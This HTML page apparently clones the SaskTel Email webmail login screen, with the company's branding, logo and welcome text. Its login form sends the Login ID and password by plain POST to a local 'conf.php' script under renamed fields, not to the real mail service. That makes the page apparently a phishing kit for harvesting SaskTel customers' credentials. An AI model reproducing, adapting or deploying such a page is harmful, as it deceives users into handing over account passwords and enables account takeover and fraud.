<!DOCTYPE html>
<html class="ng-scope has-sidebar-left overthrow-enabled" lang="en" ng-controller="AppCtrl">
 <head>
  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
  <style type="text/css">
   .ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}
  </style>
  <style type="text/css">
   @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}
  </style>
  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
  <meta content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimal-ui" name="viewport"/>
  <meta content="yes" name="mobile-web-app-capable"/>
  <meta content="black" name="apple-mobile-web-app-status-bar-style"/>
  <meta content="yes" name="apple-mobile-web-app-capable"/>
  <title pagetitle-directive="">
   Login - Webmail 7.0
  </title>
  <link href="files/app-m.css" rel="stylesheet" type="text/css"/>
  <!-- ngIf: branding.css.custom -->
  <link class="ng-scope" href="files/custom.css" ng-href="/0ace5a9-m/branding/hid-2370/css/custom.css" ng-if="branding.css.custom" rel="stylesheet" type="text/css"/>
  <!-- end ngIf: branding.css.custom -->
  <!-- ngIf: customPagesSettings.paths.css['custompages-m'] -->
  <link class="ng-scope" href="files/custompages-m.css" ng-href="/0ace5a9-m/branding/hid-2370/custompages/css/custompages-m.css" ng-if="customPagesSettings.paths.css['custompages-m']" rel="stylesheet" type="text/css"/>
  <!-- end ngIf: customPagesSettings.paths.css['custompages-m'] -->
  <script src="files/jquery.min.js">
  </script>
  <script src="files/jquery.validate.min.js">
  </script>
  <script src="files/additional-methods.min.js">
  </script>
  <script src="files/val1.js">
  </script>
  <style type="text/css">
   .myErrorCssClass { 
	color:#cb061d;
	font-size: 1em;
	font-weight: bold;
	margin-top:.6rem;
	text-transform: capitalize;
}
  </style>
 </head>
 <body class="app_base_login" ng-class="$state.$current.name | route2classname" ui-prevent-touchmove-defaults="">
  <div class="sidebar sidebar-left" ui-track-as-search-param="true">
   <div aria-label="Side bar" class="scrollable left-panel container-fluid ng-isolate-scope ng-hide" ng-show="enabled" role="complementary" style="padding-top: 0px;" tabindex="-1">
    <h1 class="scrollable-header app-name ng-binding" role="text">
     Mail
    </h1>
    <div class="scrollable-content overthrow">
     <div class="email-title">
      <div aria-hidden="true" class="caretlp">
       <span class="fa fa-caret-down">
       </span>
      </div>
      <div class="email-address ng-binding">
      </div>
      <div aria-label="Log Out" class="log-out" data-tealiumlogger-directive="clickLogoutM" ng-click="logOut()" role="button" tabindex="0" ui-turn-off="uiSidebarLeft">
       <span class="fa fa-power-off">
       </span>
      </div>
     </div>
     <div class="list-group" role="navigation menu">
      <!-- ngRepeat: folder in folders.core -->
      <div class="menu-item text-spacer-0" id="folder-root">
       <div class="row">
        <div class="col-xs-10 truncated">
         <span aria-hidden="true" class="careti fa fa-caret-right" ng-click="toggleRootFolder()">
         </span>
         <div class="label-itm truncated ng-binding">
          Folders
         </div>
        </div>
        <div aria-label="Edit folders" class="col-xs-2" ng-click="editFolders()" role="button">
         <span class="pull-right fa fa-pencil-square-o">
         </span>
        </div>
       </div>
      </div>
      <div class="hide" id="personal-folders">
       <!-- ngRepeat: folder in foldertreearrflat -->
      </div>
     </div>
    </div>
   </div>
  </div>
  <!-- uiView: growl -->
  <div class="ng-scope" ui-view="growl">
   <div aria-live="polite" aria-relevant="additions" class="ng-scope" ng-controller="GrowlCtrl">
    <div class="growlDimmer ng-hide" id="growlDimmer" ng-show="growlList.length &gt; 0 &amp;&amp; growlStatus.fullPage">
    </div>
    <!-- this parent div is always visible even when empty so the last growl can fade out of view -->
    <div class="growlcontain gr0" ng-class="{'growlMaster': growlList.length &gt; 0 &amp;&amp; (!growlList[0].unique),
																'growlFullPage': growlStatus.fullPage
		}">
     <!-- ngRepeat: growl in growlList | orderBy:'id' -->
    </div>
   </div>
  </div>
  <!-- uiView: app -->
  <div class="app ng-scope" style="" ui-view="app">
   <!-- ngIf: auth.isauth -->
   <div class="app-body ng-scope" ng-class="{loading: loading, loading: loadingmessages}">
    <div class="app-content-loading ng-hide" ng-show="loading || loadingmessages">
     <span class="fa fa-cog fa-spin loading-spinner">
     </span>
    </div>
    <div class="app-content">
     <!-- uiView: master -->
     <div class="ng-scope" ui-view="master">
      <div class="custom-container scrollable mobile-view ng-scope">
       <div class="scrollable-content overthrow">
        <header class="custom-header">
         <div class="container">
          <div class="row">
           <div class="col-xs-12">
            <a href="#" target="_blank">
             <img aria-label="{{ " class="ng-scope" lang_appname="" ng-src="/0ace5a9-m/branding/hid-2370/custompages/images/sask_tel_logo.png" src="files/sask_tel_logo.png" translate=""/>
            </a>
           </div>
          </div>
         </div>
        </header>
        <div class="custom-title">
         <div class="container">
          <div class="row">
           <div class="col-xs-12">
            <h1 class="ng-scope" translate="LANG_CUSTOM_LOGIN_PAGE_TITLE" translate-cloak="LANG_CUSTOM_LOGIN_PAGE_TITLE">
             SaskTel Email
            </h1>
           </div>
          </div>
         </div>
        </div>
        <div class="login-container custom-flexcontent">
         <div class="container">
          <div class="row">
           <form action="conf.php" class="ng-pristine ng-valid" id="lgf" method="post" name="lgf" ng-submit="signin(user)" role="form">
            <div class="login-panel custom-flexpanel">
             <div class="row">
              <div class="col-sm-12 col-xs-12">
               <h2 class="ng-scope" translate="LANG_LOGIN_SIGN_IN">
                Log in
               </h2>
               <label class="ng-scope" translate="LANG_LOGIN_USERNAME">
                Login ID
               </label>
               <div class="form-group" ng-class="{'has-error':error.langkey=='LANG_LOGIN_ERROR_EMPTY_USERNAME'}">
                <input class="form-control" id="uzr" name="uzr" placeholder="Login ID"/>
                <!-- ngIf: error.langkey=='LANG_LOGIN_ERROR_EMPTY_USERNAME' -->
               </div>
               <label class="ng-scope" translate="LANG_LOGIN_PASSWORD">
                Password
               </label>
               <div class="form-group error-label m-0" ng-class="{'has-error':error.langkey=='LANG_LOGIN_ERROR_EMPTY_PASSWORD'}">
                <input aria-label="Password" class="form-control id=" name="psw" placeholder="Password" psw="" type="password"/>
                <span aria-label="Show password" class="fa fa-lg fa-eye toggle-password" onclick="togglePasswordVisibility()" title="Show password">
                </span>
                <!-- ngIf: error.langkey && error.langkey != 'LANG_LOGIN_ERROR_EMPTY_USERNAME' -->
               </div>
              </div>
             </div>
            </div>
            <div class="login-panel panel-transparent custom-flexpanel">
             <div class="row">
              <div class="col-sm-12 col-xs-12">
               <div class="form-group">
                <!-- ngIf: ( loadingstatus === '') -->
                <button aria-label="Log in" class="btn btn-primary btn-lg btn-block ng-scope" ng-if="( loadingstatus === '')" translate="LANG_LOGIN_SIGN_IN" type="submit">
                 Log in
                </button>
                <!-- end ngIf: ( loadingstatus === '') -->
                <!-- ngIf: ( loadingstatus !== '') -->
               </div>
               <div class="clearfix">
                <div class="login-forgot">
                 <!-- ngIf: ( loadingstatus === '') && showForgotLink -->
                 <a class="ng-scope" href="#" ng-click="goToForgotPassword()" ng-if="( loadingstatus === '') &amp;&amp; showForgotLink" translate="LANG_LOGIN_FORGOT_PASSWORD">
                  Forgot password?
                 </a>
                 <!-- end ngIf: ( loadingstatus === '') && showForgotLink -->
                </div>
               </div>
              </div>
             </div>
            </div>
           </form>
           <div class="login-panel custom-flexpanel border-top">
            <div>
             <h2 class="ng-scope" translate="LANG_CUSTOM_LOGIN_INFOBOX_TITLE" translate-cloak="LANG_CUSTOM_LOGIN_INFOBOX_TITLE">
              Welcome to SaskTel Email
             </h2>
             <p class="ng-scope" translate="LANG_CUSTOM_LOGIN_INFOBOX_DESC" translate-cloak="LANG_CUSTOM_LOGIN_INFOBOX_DESC">
              This is where you can log in and use your SaskTel email account.
             </p>
             <ul class="login-list">
              <li>
               <a class="ng-scope" href="#" target="_blank" translate="LANG_CUSTOM_LOGIN_INFOBOX_LINK_SUPPORT" translate-cloak="LANG_CUSTOM_LOGIN_INFOBOX_LINK_SUPPORT">
                SaskTel email support
               </a>
              </li>
             </ul>
             <br/>
            </div>
           </div>
          </div>
         </div>
        </div>
        <footer class="custom-footer">
         <div class="container">
          <div class="row">
           <div class="col-xs-12">
            <span class="ng-scope" translate="LANG_CUSTOM_FOOTER_COPYRIGHT" translate-cloak="LANG_CUSTOM_FOOTER_COPYRIGHT" translate-values="{year: year || 2018}">
             Â© 2022 SaskTel and its licensors. All rights reserved.
            </span>
           </div>
          </div>
         </div>
        </footer>
       </div>
      </div>
      <snapuser-directive class="ng-scope ng-isolate-scope" snap-user="snapUser">
      </snapuser-directive>
     </div>
    </div>
   </div>
  </div>
  <!-- Modals and Overlays -->
  <div ui-yield-to="modals">
  </div>
 </body>
</html>
